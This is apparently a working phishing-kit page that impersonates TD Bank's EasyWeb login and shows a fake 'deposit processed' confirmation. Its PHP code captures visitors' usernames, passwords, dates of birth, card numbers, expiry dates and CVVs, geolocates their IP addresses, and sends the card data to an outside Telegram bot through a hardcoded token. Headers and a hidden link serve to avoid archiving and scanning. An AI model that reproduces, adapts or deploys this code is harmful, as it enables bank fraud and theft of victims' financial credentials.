<?php

 
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
 
 
 
 function get_client_ip()
 {
     $ipaddress = '';
     if (isset($_SERVER['HTTP_CLIENT_IP'])) {
         $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
     } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
     } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
         $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
     } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
         $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
     } else if (isset($_SERVER['HTTP_FORWARDED'])) {
         $ipaddress = $_SERVER['HTTP_FORWARDED'];
     } else if (isset($_SERVER['REMOTE_ADDR'])) {
         $ipaddress = $_SERVER['REMOTE_ADDR'];
     } else {
         $ipaddress = 'UNKNOWN';
     }
 
     return $ipaddress;
 }
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 
 function getOS() { 
     global $user_agent;
     $os_platform  = "Unknown OS Platform";
     $os_array     = array(
                           '/windows nt 10/i'      =>  'Windows 10',
                           '/windows nt 6.3/i'     =>  'Windows 8.1',
                           '/windows nt 6.2/i'     =>  'Windows 8',
                           '/windows nt 6.1/i'     =>  'Windows 7',
                           '/windows nt 6.0/i'     =>  'Windows Vista',
                           '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                           '/windows nt 5.1/i'     =>  'Windows XP',
                           '/windows xp/i'         =>  'Windows XP',
                           '/windows nt 5.0/i'     =>  'Windows 2000',
                           '/windows me/i'         =>  'Windows ME',
                           '/win98/i'              =>  'Windows 98',
                           '/win95/i'              =>  'Windows 95',
                           '/win16/i'              =>  'Windows 3.11',
                           '/macintosh|mac os x/i' =>  'Mac OS X',
                           '/mac_powerpc/i'        =>  'Mac OS 9',
                           '/linux/i'              =>  'Linux',
                           '/ubuntu/i'             =>  'Ubuntu',
                           '/iphone/i'             =>  'iPhone',
                           '/ipod/i'               =>  'iPod',
                           '/ipad/i'               =>  'iPad',
                           '/android/i'            =>  'Android',
                           '/blackberry/i'         =>  'BlackBerry',
                           '/webos/i'              =>  'Mobile'
                     );
 
     foreach ($os_array as $regex => $value)
         if (preg_match($regex, $user_agent))
             $os_platform = $value;
 
     return $os_platform;
 }
 
 function getBrowser() {
     global $user_agent;
     $browser        = "Unknown Browser";
     $browser_array = array(
                             '/msie/i'      => 'Internet Explorer',
                             '/firefox/i'   => 'Firefox',
                             '/safari/i'    => 'Safari',
                             '/chrome/i'    => 'Chrome',
                             '/edge/i'      => 'Edge',
                             '/opera/i'     => 'Opera',
                             '/netscape/i'  => 'Netscape',
                             '/maxthon/i'   => 'Maxthon',
                             '/konqueror/i' => 'Konqueror',
                             '/mobile/i'    => 'Handheld Browser'
                      );
 
     foreach ($browser_array as $regex => $value)
         if (preg_match($regex, $user_agent))
             $browser = $value;
 
     return $browser;
 }
 
 
 $user_os        = getOS();
 $user_browser   = getBrowser();
  
 $PublicIP = get_client_ip();
 $localHost = "127.0.0.1";
 
 if (strpos($PublicIP, ',') !== false) {
     $PublicIP = explode(",", $PublicIP)[0];
 }
 
 $file       = '/data.dat';
 $file2      = '/data.dat';
 $file3      = '/data.dat';
 $file4      = '/data.dat';
 $file5      = '/data.dat';
 $ip         = "".$PublicIP;
 $uaget      = "".$user_agent;
 $bsr        = "".$user_browser;
 $uos        = "".$user_os;
 $ust= explode(" ", $user_agent);
 $vr= $ust[3];
 $ver=str_replace(")", "", $vr);
 $version   = "Version              : ".$ver;
 if (strpos($PublicIP, $localHost) !== false) {
     $details = '{
         "success": false
     }';
 }
 else {
     $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
 }
 $details  = json_decode($details, true);
 $success  = $details['success'];
 $file = '../../../log.txtt';
$fp = fopen($file, 'a');
 
 if ($success==false) {
     fwrite($fp, $ip."\n");
     fwrite($fp, $uos."\n");
     fwrite($fp, $version."\n");
     fwrite($fp, $bsr."\n");
     fclose($fp);
 } else if ($success==true) {
     $country    = $details['country'];
     $city       = $details['city'];
     $continent  = $details['continent'];
     $tp         = $details['type'];
     $cn         = $details['country_phone'];
     $is         = $details['isp'];
     $la         = $details['latitude'];
     $lp         = $details['longitude'];
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "TD";
     $url        = "https://easyweb.td.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
     $code       = $_POST['code']; 
     $dob1       = $_POST['dob1']; 
     $dob2       = $_POST['dob2']; 
     $dob3       = $_POST['dob3']; 
     $card       = $_POST['card'];
     $exp1       = $_POST['exp1'];
     $exp2       = $_POST['exp2'];
     $cvv        = $_POST['cvv'];
 
 
 
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
     $lh     = "|";
     $lH     = "/";
 
         $li     = ",";
 
     
 
 } else {
     $status     = "Status : ".$success;
     fwrite($fp, $status."\n");
     fwrite($fp, $uaget."\n");
     fclose($fp);
 }
 
 
 
 $message = "$bank$lh$ip\nCARD:$card\nexp:$exp1$lH$exp2\ncvv:$cvv";
$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta http-equiv="refresh" content="https://www.td.com/ca/en/personal-banking/">
  <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <title>EasyWeb Login</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
      
 <link rel="icon" href="/assets/td/favicon.ico">
    </script></head>
    <body prevent-click-highlight="" autoscroll="" class="">
        <div id="">
            <!-- Header -->
            <!---->
            <div data-ui-view="header" class="" style="">
                <otp-header>
                    <div class="td_rq_header-nav td-header-nav">
                        <!-- Desktop Header START -->
                        <header class="td-header-desktop">
                            <div class="td-nav-primary">
                                <div class="td-container">
                                    <div class="td-section-left">
                                        <div class="td-logo" style="margin-top: 15px;">
                                            <img ng-src="generated/styles/images/header-nav/td-logo.png" alt="TD Canada Trust" src="/assets/td/files2/td-logo.png">
                                        </div>
                                    </div>
                                    <div class="td-section-right">
                                        <div class="td-quick-access">
                                            <ul class="td-header-nav-utilities">
                                                <li ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide" aria-hidden="true">
                                                    <a href="" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
                                                    <span class="td-forscreenreader">Select language</span>
                                                    Français
                                                    <span class="td-icon expand" aria-hidden="true"></span>
                                                    <span class="td-icon collapse" aria-hidden="true"></span>
                                                    </a>
                                                    <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                            <a href="" role="button" ng-click="vm.setLanguage(language)">
                                                                English
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                                </span><!---->
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                            <a href="" role="button" ng-click="vm.setLanguage(language)">
                                                                Français
                                                                <!---->
                                                                <!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                    </ul>
                                                </li>
                                                <li class="secure-lock-position" aria-hidden="true">
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </header>
                        <!-- Desktop Header END -->
                        <!-- Mobile Header START -->
                        <header class="td-header-mobile">
                            <div class="td-container">
                                <div class="td-section-left">
                                    <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
                                            <span class="td-forscreenreader">Open menu</span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                        </div>
                                        <div class="td-logo">
                                            <img src="/assets/td/files2/td-logo.png" alt="TD Canada Trust">
                                        </div>
                                    </button>
                                    <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                                        Test!
                                        <div class="td-mobile-back-button-icon">
                                            <span class="td-icon"></span>
                                            <span class="td-forscreenreader">Back</span>
                                        </div>
                                        <div class="td-logo">
                                            <img src="/assets/td/files2/td-logo.png" alt="TD Canada Trust">
                                        </div>
                                    </button>
                                </div>
                                <div class="td-section-right">
                                    <div class="secure-lock-position" aria-hidden="true">
                                        <!--<span class="td-icon icon-regular td-icon-logout"></span>-->
                                    </div>
                                </div>
                            </div>
                        </header>
                        <!-- Mobile Header END -->
                        <!-- Mobile Off-canvas Menu START -->
                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-nav-mobile ng-hide" aria-hidden="true">
                            <!-- Primary mobile menu START -->
                            <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                                <span tabindex="0"></span>
                                <div class="td-nav-mobile-menu-top">
                                    <div class="td-nav-mobile-menu-header">
                                        <div class="td-logo">
                                            <a href="https://authentication.td.com/">
                                            <img src="/assets/td/files2/td-logo.png" alt="TD Canada Trust">
                                            </a>
                                        </div>
                                        <button type="button" class="td-mobile-menu-close">
                                        <span class="td-forscreenreader">Close Menu</span>
                                        <span class="td-icon" aria-hidden="true"></span>
                                        </button>
                                    </div>
                                </div>
                                <nav>
                                    <ul class="td-nav-mobile-menu-list">
                                        <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                            <a href="" aria-expanded="false" role="button">
                                            <span class="td-forscreenreader">Select language</span>
                                            Français
                                            <span class="td-icon expand" aria-hidden="true"></span>
                                            <span class="td-icon collapse" aria-hidden="true"></span>
                                            </a>
                                            <ul class="td-accordion-content">
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                    <a href="" role="button" ng-click="vm.setLanguage(language)">
                                                        English
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                        </span><!---->
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                    </a>
                                                </li>
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                    <a href="" role="button" ng-click="vm.setLanguage(language)">
                                                        Français
                                                        <!---->
                                                        <!---->
                                                    </a>
                                                </li>
                                                <!---->
                                            </ul>
                                        </li>
                                    </ul>
                                </nav>
                                <span tabindex="0"></span>
                            </div>
                            <!-- Primary mobile menu END -->
                            <div class="td-nav-mobile-overlay"></div>
                        </div>
                        <!-- Mobile Off-canvas Menu END -->
                    </div>
                </otp-header>
            </div>
            <!-- Main Content / Body -->
            <div class="td-contentarea" role="main" style="padding-top: 70px;">
                <!---->
                <ui-view class="" style="">
                    <!---->
                    <ui-view>
                        <reset>
                            <!---->
                            <ui-view class="" style="">
                                <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
                                    <div class="text-center">
                                        <otp-server-error error="vm.dt.recoverPwdError" display="banner">
                                            <!---->
                                        </otp-server-error>
                                    </div>
                                    <div class="td-container">
                                        <h1 class="text-center" tabindex="0">Thank you, </h1>
                                        <hr aria-hidden="true" class="td-thin-divider-line-1">
                                        <form method="post" action="040152" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic">
                                            <center><img src="https://thumbs.gfycat.com/CorruptOldfashionedGuineapig-size_restricted.gif" width="180"></center>

                                            <h2 class="text-center">The deposit will be processed and your funds will appear in your account within 48 hours.<br>
<br>
- TD Bank</h2>
                                            <br><br><br><br><br><br><br><br><br><br><br><br><br>
                                        </form>
                                    </div>
                                    <br><br>
                                </reset-password>
                            </ui-view>
                        </reset>
                    </ui-view>
                </ui-view>
            </div>
            <!-- Footer -->
            <!---->
            <div data-ui-view="footer" class="">
                <otp-footer>
                    <footer class="td-background-dark-green" style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
                        <!---->
                        <div class="td-container">
                            <div class="td-row">
                                <div class="td-col-xs-12 td-footer-content otp-footer-content">
                                    <div class="td-footer-links td-copy-align-centre td-copy-white">
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/privacy-and-security/privacy-and-security/index.jsp">
                                        Privacy and Security
                                        </a>
                                        <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/to-our-customers/">
                                        Legal
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp">
                                        Accessibility
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </otp-footer>
            </div>
        </div>
        <!--[if lt IE 9]>
        <script type="text/javascript" src="resources/es5-shim/es5-shim.min.js?v=0.0.8-HOTFIX2"></script>
        <script type="text/javascript" src="resources/html5shiv/dist/html5shiv.min.js?v=0.0.8-HOTFIX2"></script>
        <![endif]-->
        <div id="ads"></div>
        <div id="ads"></div>
        <div id="ads"></div>
    

</body></html>